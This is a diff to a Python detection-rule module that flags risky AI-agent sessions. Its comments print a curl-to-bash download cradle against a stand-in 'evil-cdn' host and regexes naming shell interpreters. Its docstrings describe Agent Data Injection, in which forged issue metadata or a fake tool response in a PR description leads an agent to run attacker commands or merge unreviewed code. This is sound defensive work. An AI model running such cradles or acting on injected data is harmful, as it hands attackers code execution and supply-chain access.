@@ -162,6 +162,51 @@ _DELETE_COMMAND = re.compile(
 # Scheduled work runs at night by design; excluded from the off-hours rule.
 _SCHEDULED_TRIGGERS = frozenset({"cron", "schedule", "scheduled", "timer"})
 
+# Fetch remote content and feed it straight to an interpreter. The classic
+# download cradle, and the payload shape in the ADI remote-code-execution chain
+# (arXiv:2607.05120 §4.2). Deliberately independent of _RAW_IP_URL: a real
+# attacker uses a domain, which reads as legitimate, so requiring a bare IP
+# missed `curl https://evil-cdn.example.com/x.sh | bash` entirely.
+_PIPE_TO_SHELL = re.compile(
+    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
+    r"(sudo\s+)?\b(ba|z|k|da)?sh\b|"
+    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
+    r"(iex|invoke-expression|python\d?|perl|ruby|node)\b",
+    re.IGNORECASE,
+)
+
+# Tools/commands that pull content an outsider can author. ADI's whole premise
+# is that this data is treated as trusted, so anything a session does *after*
+# ingesting it deserves provenance.
+_UNTRUSTED_INPUT_METHODS = frozenset(
+    {"webfetch", "websearch", "readissue", "readprdesc", "readprcommit", "readcomments", "browse"}
+)
+# Note the absence of a bare `curl https://...`. A curl is ambiguous: this engine
+# already models it as egress (TA0011), so counting it as ingestion too made it
+# both halves of this rule, and two ordinary web reads raised an alarm. Only
+# unambiguous content-ingestion vectors belong here.
+_UNTRUSTED_INPUT_COMMAND = re.compile(
+    r"\bgh\s+(issue|pr)\s+(view|list|diff|comment)|"
+    r"\bgit\s+(fetch|pull|clone)\b",
+    re.IGNORECASE,
+)
+
+# Techniques that make a post-ingestion action worth flagging. Plain execution
+# is excluded on purpose: "read the issue, then run the tests" is the single
+# most common agent workflow there is, and firing on it would bury the signal.
+_RISKY_TACTICS = frozenset({"TA0006", "TA0011", "TA0010"})  # cred access, C2, exfil
+_RISKY_TECHNIQUES = ("T1552", "T1485", "T1027", "T1105", "T1071")
+
+# PR review: reading the description is not reading the code. ADI's supply-chain
+# attack (§4.3) injects a fake tool response so the agent believes it reviewed a
+# commit it never fetched.
+_PR_DESC_METHODS = frozenset({"readprdesc", "readpr", "prview"})
+_PR_COMMIT_METHODS = frozenset({"readprcommit", "prdiff", "readcommit", "prfiles"})
+_PR_MERGE_METHODS = frozenset({"mergepr", "prmerge", "merge"})
+_PR_DESC_COMMAND = re.compile(r"\bgh\s+pr\s+view\b", re.IGNORECASE)
+_PR_COMMIT_COMMAND = re.compile(r"\bgh\s+pr\s+(diff|checkout|files)\b|\bgit\s+show\b", re.IGNORECASE)
+_PR_MERGE_COMMAND = re.compile(r"\bgh\s+pr\s+merge\b|\bgit\s+merge\b", re.IGNORECASE)
+
 
 def rule_credential_exfil(events: list[dict[str, Any]]) -> list[Detection]:
     """Credential access (T1552) then network egress (TA0011) in one session.
@@ -341,19 +386,31 @@ def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detectio
         cmd = _command(event)
         if not cmd:
             continue
-        if _RAW_IP_URL.search(cmd) and _DOWNLOAD_EXEC.search(cmd):
+        raw_ip_fetch = bool(_RAW_IP_URL.search(cmd) and _DOWNLOAD_EXEC.search(cmd))
+        # Piping a fetch into an interpreter is a cradle whatever the host is.
+        # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
+        # straight through, which is what a real attacker actually uses.
+        piped = bool(_PIPE_TO_SHELL.search(cmd))
+        if raw_ip_fetch or piped:
             encoded = bool(_ENCODED_CMD.search(cmd))
             techniques = ["T1105", "T1059.001"]  # Ingress Tool Transfer, PowerShell
             if encoded:
                 techniques.append("T1027")  # Obfuscated Files or Information
+            # Say which thing was actually seen. The rule fires on two distinct
+            # shapes now, and reporting "a raw IP" for a domain-hosted cradle
+            # would be a false statement in the detection itself.
+            how = (
+                "piped remote content straight into an interpreter"
+                if piped
+                else "fetched and executed content from a raw IP address"
+            )
             return [
                 Detection(
                     rule_id="encoded-command-download",
-                    title="Payload download from a raw IP",
+                    title="Remote code fetched and executed",
                     severity="critical",
                     summary=(
-                        f"{_tool_qualified(event) or 'A command'} fetched and executed content "
-                        "from a raw IP address"
+                        f"{_tool_qualified(event) or 'A command'} {how}"
                         + (" via an encoded command" if encoded else "")
                         + ". A classic download cradle."
                     ),
@@ -489,6 +546,128 @@ def rule_off_hours_activity(events: list[dict[str, Any]]) -> list[Detection]:
     return []
 
 
+def _method(event: dict[str, Any]) -> str:
+    return _norm_tool(_tool_qualified(event).rsplit(".", 1)[-1])
+
+
+def _is_untrusted_input(event: dict[str, Any]) -> bool:
+    """Did this event pull content an outsider could have authored?"""
+    if _method(event) in _UNTRUSTED_INPUT_METHODS:
+        return True
+    return bool(_UNTRUSTED_INPUT_COMMAND.search(_command(event)))
+
+
+def _is_risky(event: dict[str, Any]) -> bool:
+    if _tactic_id(event) in _RISKY_TACTICS:
+        return True
+    technique = _technique_id(event)
+    return any(technique.startswith(t) for t in _RISKY_TECHNIQUES)
+
+
+def rule_untrusted_input_then_risky_action(events: list[dict[str, Any]]) -> list[Detection]:
+    """A session ingested attacker-authorable data, then did something dangerous.
+
+    Agent Data Injection (arXiv:2607.05120): an attacker hides malicious data
+    inside content the agent already trusts, such as a GitHub issue comment
+    carrying forged author metadata. The agent then acts on it. The paper's
+    remote-code-execution chain is exactly `gh issue view` followed by executing
+    a command the attacker supplied.
+
+    This rule adds *provenance*, which no other rule here has: it says the risky
+    action happened in a session that had already swallowed attacker-controllable
+    content. That matters because the paper shows every prevention defense fails
+    on ADI, including alignment guardrails, since the agent is still doing the
+    task the user asked for. Only the data it acted on was corrupted, so the
+    behaviour is the only evidence left.
+
+    Plain execution after ingestion is deliberately NOT flagged: "read the issue,
+    then run the tests" is the most common agent workflow there is. Only an
+    already-risky technique (credential access, egress, destruction, obfuscated
+    download) qualifies.
+    """
+    ingest_idx = next((i for i, e in enumerate(events) if _is_untrusted_input(e)), None)
+    if ingest_idx is None:
+        return []
+
+    for event in events[ingest_idx + 1:]:
+        if _action_type(event) != "tool_called" or _outcome(event) != "success":
+            continue
+        # Reading more untrusted content is not an escalation. Without this,
+        # two consecutive web reads flagged each other.
+        if _is_untrusted_input(event):
+            continue
+        if not _is_risky(event):
+            continue
+        source = events[ingest_idx]
+        return [
+            Detection(
+                rule_id="untrusted-input-then-risky-action",
+                title="Risky action after ingesting untrusted content",
+                severity="high",
+                summary=(
+                    f"{_tool_qualified(source) or 'A tool'} pulled externally-authored content, "
+                    f"then {_tool_qualified(event) or 'a tool'} performed a "
+                    f"{_technique_id(event) or 'risky'} action in the same session. "
+                    "Agent data injection hides instructions in data the agent trusts."
+                ),
+                correlation_id=_correlation_id(events),
+                tactic_ids=[t for t in (_tactic_id(source), _tactic_id(event)) if t],
+                technique_ids=[t for t in (_technique_id(source), _technique_id(event)) if t],
+                event_ids=[_event_id(source), _event_id(event)],
+                first_seen_utc=_ts(source),
+                last_seen_utc=_ts(event),
+            )
+        ]
+    return []
+
+
+def rule_pr_merged_without_review(events: list[dict[str, Any]]) -> list[Detection]:
+    """A pull request was merged without the agent ever fetching the code.
+
+    Agent Data Injection (arXiv:2607.05120 §4.3): an attacker crafts a PR whose
+    description contains a forged tool call and response, so the agent believes
+    it already reviewed a commit it never read, and merges. The tell is an
+    absence: a merge with no preceding fetch of the diff.
+
+    Worth flagging even without ADI. An agent that merges code it never looked at
+    is a supply-chain risk on its own.
+    """
+    reviewed = False
+    saw_pr = False
+    for event in events:
+        if _action_type(event) != "tool_called":
+            continue
+        method, cmd = _method(event), _command(event)
+
+        if method in _PR_DESC_METHODS or _PR_DESC_COMMAND.search(cmd):
+            saw_pr = True
+        if method in _PR_COMMIT_METHODS or _PR_COMMIT_COMMAND.search(cmd):
+            reviewed = True
+            continue
+
+        merging = method in _PR_MERGE_METHODS or _PR_MERGE_COMMAND.search(cmd)
+        if merging and saw_pr and not reviewed and _outcome(event) == "success":
+            return [
+                Detection(
+                    rule_id="pr-merged-without-review",
+                    title="Pull request merged without reading the code",
+                    severity="critical",
+                    summary=(
+                        "The agent merged a pull request without ever fetching its diff. "
+                        "A forged tool response can convince an agent it reviewed code it "
+                        "never read."
+                    ),
+                    correlation_id=_correlation_id(events),
+                    tactic_ids=["TA0001"],  # Initial Access via supply chain
+                    technique_ids=["T1195.002"],  # Compromise Software Supply Chain
+                    event_ids=[_event_id(event)],
+                    first_seen_utc=_ts(event),
+                    last_seen_utc=_ts(event),
+                )
+            ]
+    return []
+
+
 REGISTRY = [
     rule_credential_exfil,
     rule_autonomous_unapproved_write,
@@ -497,4 +676,6 @@ REGISTRY = [
     rule_encoded_command_download,
     rule_destructive_delete_burst,
     rule_off_hours_activity,
+    rule_untrusted_input_then_risky_action,
+    rule_pr_merged_without_review,
 ]
